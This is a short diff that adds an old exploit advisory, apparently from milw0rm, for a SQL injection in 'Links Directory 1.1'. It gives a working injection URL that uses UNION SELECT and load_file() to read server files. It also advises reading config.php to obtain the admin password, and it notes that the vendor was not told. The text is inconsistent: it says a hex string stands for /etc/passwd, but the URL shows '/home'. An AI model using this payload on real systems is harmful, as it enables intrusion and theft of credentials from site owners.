@@ -1,0 +1,41 @@
+--==+================================================================================+==--
+--==+		      Links Directory 1.1 SQL Injection Vulnerbilitys	             +==--
+--==+================================================================================+==--
+
+
+
+Discovered By: t0pP8uZz & xprog
+Discovered On: 6 April 2008
+Script Download: N/A
+DORK: N/A
+
+Vendor Has Not Been Notified!
+
+
+DESCRIPTION: 
+Links directorys is vulnerable to a insecure sql query.
+
+
+SQL Injeciton:
+http://site.com/links.php?ax=list&sub=2&cat_id=-1%20UNION%20ALL%20SELECT%201,2,load_file('/home'),4,5,6,7,8,9,10,11,12,13%20FROM%20links/*
+
+
+
+NOTE/TIP: 
+the above sql injection allows a remote attacker to load a localfile on the vulnerable server.
+the hex you see above inside the load_file() function is "/etc/passwd" in plaintext, some permissions are
+needed to use this function. this all depends on what mysql user is running.
+
+the admin password is in the config.php file if you can find the complete path then you can use load file to
+view the contents of the file and view the admin password.
+
+
+GREETZ: milw0rm.com, h4ck-y0u.org, CipherCrew !
+
+
+
+--==+================================================================================+==--
+--==+		      Links Directory 1.1 SQL Injection Vulnerbilitys	             +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2008-04-05]
